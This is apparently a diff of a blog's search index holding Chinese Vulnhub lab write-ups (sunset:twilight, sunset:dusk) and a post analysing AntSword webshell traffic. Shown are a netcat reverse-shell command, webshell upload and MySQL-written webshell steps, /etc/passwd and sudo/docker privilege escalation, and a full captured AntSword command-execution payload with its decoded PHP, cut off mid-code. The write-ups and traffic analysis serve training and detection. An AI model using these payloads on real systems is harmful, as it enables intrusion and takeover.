+        <tag>exploit</tag>
+        <tag>file-upload</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub nezikochan靶机</title>
     <url>//nezikochan.html</url>
     <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
@@ -3090,56 +3170,6 @@
       <tags>
         <tag>exploit</tag>
         <tag>opennetadmin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub sunset:twilight靶机</title>
-    <url>//sunset-twilight.html</url>
-    <content><![CDATA[<p>Vulnhub sunset系列</p>
-<a id="more"></a>
-
-<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
-<li>靶机ip: <code>192.168.6.129</code></li>
-<li>kali ip: <code>192.168.6.128</code></li>
-</ul>
-<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
-
-<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
-<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
-<p>点击<code>pictures</code></p>
-<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
-<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
-<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
-<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
-<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
-<p>找到了这个目录，访问之后是文件上传</p>
-<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
-<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
-<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
-<p>访问之后得到shell</p>
-<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
-
-<p>看到php文件，以为是用php提权，结果发现并不是</p>
-<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
-<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
-<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
-<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
-<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
-<p>然后切换用户，得到<code>root</code>权限</p>
-<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
-<p>这次的图不是很好看（</p>
-<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>sunset</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>file-upload</tag>
       </tags>
   </entry>
   <entry>
@@ -3281,6 +3311,78 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub sunset:dusk靶机</title>
+    <url>//sunset-dusk.html</url>
+    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
+<p>简单难度</p>
+<a id="more"></a>
+
+<h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
+<li>  靶机：<code>192.168.2.2</code></li>
+<li>  攻击机： <code>192.168.2.3</code></li>
+</ul>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放了<code>21, 22, 25, 80, 3306, 8080</code>端口</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p>
+<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问<code>80</code>端口，是<code>apache</code>的默认页面</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">爆破一下目录</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p>
+<p>啥也没有，看来入口点不是这儿</p>
+<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>还有一个8080端口，访问一下，发现列出了目录内容和目录路径</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p>
+<p>应该是在这个地方写webshell了</p>
+<p>但是又没有能够写的地方。</p>
+<h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>尝试一下sql密码的爆破</p>
+<p>结果啪的一下就爆出来了，很快啊</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p>
+<p>连上去</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p>
+<p>看一下能否写文件，</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p>
+<p>发现<code>secure_file_priv</code>这一栏为空，代表任何目录都可以写。那就写入一个webshell</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p>
+<p>访问<code>http://192.168.2.2:8080/1.php</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p>
+<p>拿一个反弹shell</p>
+<p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p>
+<p>在本机监听端口<code>nc -vlp 8848</code></p>
+<p>接收到一个反弹shell，并使用pty模块</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p>
+<p>至此，写入了webshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下具有<code>setuid</code>权限的程序</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p>
+<p>没啥能用的</p>
+<p><code>sudo -l</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p>
+<p><code>make</code>是可以提权的。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p>
+<p>照着做，提权到<code>dusk</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p>
+<p>直接写入<code>.ssh/authorized_keys</code></p>
+<p>使用ssh登录</p>
+<p>然后就断了，翻找了一下，发现<code>docker</code>能够提权</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p>
+<p>尝试一下</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p>
+<p>啊这？</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p>
+<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在尝试提权的过程中，我试着用<code>ps -auxwww</code>命令，查看了一下历史进程</p>
+<p>发现了<code>root</code>运行的<code>ftp</code>的用户名和密码</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p>
+<p>然后ftp登录上去</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p>
+<p>路径是<code>/root</code>，下面的<code>root.txt</code>就是最终的flag，可以get下来。。。</p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>sunset</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>enum</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub sunset:decoy靶机</title>
     <url>//sunset-decoy.html</url>
     <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
@@ -3349,78 +3451,6 @@
 <p>本地监听，运行</p>
 <img src="sunset:decoy/image-20200711001746820.png" alt="image-20200711001746820" style="zoom:33%;" />
 
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>sunset</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>enum</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub sunset:dusk靶机</title>
-    <url>//sunset-dusk.html</url>
-    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
-<p>简单难度</p>
-<a id="more"></a>
-
-<h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
-<li>  靶机：<code>192.168.2.2</code></li>
-<li>  攻击机： <code>192.168.2.3</code></li>
-</ul>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放了<code>21, 22, 25, 80, 3306, 8080</code>端口</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p>
-<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问<code>80</code>端口，是<code>apache</code>的默认页面</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">爆破一下目录</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p>
-<p>啥也没有，看来入口点不是这儿</p>
-<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>还有一个8080端口，访问一下，发现列出了目录内容和目录路径</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p>
-<p>应该是在这个地方写webshell了</p>
-<p>但是又没有能够写的地方。</p>
-<h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>尝试一下sql密码的爆破</p>
-<p>结果啪的一下就爆出来了，很快啊</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p>
-<p>连上去</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p>
-<p>看一下能否写文件，</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p>
-<p>发现<code>secure_file_priv</code>这一栏为空，代表任何目录都可以写。那就写入一个webshell</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p>
-<p>访问<code>http://192.168.2.2:8080/1.php</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p>
-<p>拿一个反弹shell</p>
-<p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p>
-<p>在本机监听端口<code>nc -vlp 8848</code></p>
-<p>接收到一个反弹shell，并使用pty模块</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p>
-<p>至此，写入了webshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下具有<code>setuid</code>权限的程序</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p>
-<p>没啥能用的</p>
-<p><code>sudo -l</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p>
-<p><code>make</code>是可以提权的。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p>
-<p>照着做，提权到<code>dusk</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p>
-<p>直接写入<code>.ssh/authorized_keys</code></p>
-<p>使用ssh登录</p>
-<p>然后就断了，翻找了一下，发现<code>docker</code>能够提权</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p>
-<p>尝试一下</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p>
-<p>啊这？</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p>
-<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在尝试提权的过程中，我试着用<code>ps -auxwww</code>命令，查看了一下历史进程</p>
-<p>发现了<code>root</code>运行的<code>ftp</code>的用户名和密码</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p>
-<p>然后ftp登录上去</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p>
-<p>路径是<code>/root</code>，下面的<code>root.txt</code>就是最终的flag，可以get下来。。。</p>
 ]]></content>
       <categories>
         <category>exploit</category>
@@ -4818,6 +4848,132 @@
       <tags>
         <tag>JavaWeb</tag>
         <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蚁剑流量分析</title>
+    <url>//AntSword.html</url>
+    <content><![CDATA[<p>分析一下蚁剑的流量特点</p>
+<h1 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h1><h2 id="虚拟终端-命令执行"><a href="#虚拟终端-命令执行" class="headerlink" title="虚拟终端 / 命令执行"></a>虚拟终端 / 命令执行</h2><p>在打开蚁剑的虚拟终端时，会执行 <code>cd [path]</code> 指令，</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623124844673.png" alt="image-20210623124844673"></p>
+<p>发出的包如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;1.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.106:80</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; chromeframe&#x2F;12.0.742.112)</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4099</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22f0b3%22.%22b67c6%22%3Becho%20%40asenc(%24output)%3Becho%20%22c91%22.%22583%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22v1f656c7c99039%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22x44aab141531de%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22u6af8538cd4c2e%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#39;trim&#39;%2Carray_map(&#39;strtolower&#39;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#39;putenv&#39;)%20%26%26%20(fe(&#39;error_log&#39;)%20%7C%7C%20fe(&#39;mail&#39;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#39;as&#39;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#39;error_log&#39;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#39;system&#39;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#39;passthru&#39;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#39;shell_exec&#39;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#39;exec&#39;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#39;popen&#39;))%7B%24fp%3D%40popen(%24c%2C&#39;r&#39;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#39;proc_open&#39;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;)%2C%202%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#39;antsystem&#39;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#39;WScript.shell&#39;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;u6af8538cd4c2e&#x3D;AN&amp;v1f656c7c99039&#x3D;gvL2Jpbi9zaA%3D%3D&amp;x44aab141531de&#x3D;T4Y2QgIi92YXIvd3d3L2h0bWwiO2NkIC92YXIvd3d3L2h0bWwvO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>返回包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Wed, 23 Jun 2021 05:30:13 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.46 (Debian)</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">f0b3b67c6[S]</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">[E]</span><br><span class="line">c91583</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将 <code>cmd</code> 的值进行 url 解码之后写入 phpstorm 中，可得到执行的 php 代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f0b3&quot;</span> . <span class="string">&quot;b67c6&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;c91&quot;</span> . <span class="string">&quot;583&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;v1f656c7c99039&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x44aab141531de&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;u6af8538cd4c2e&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span 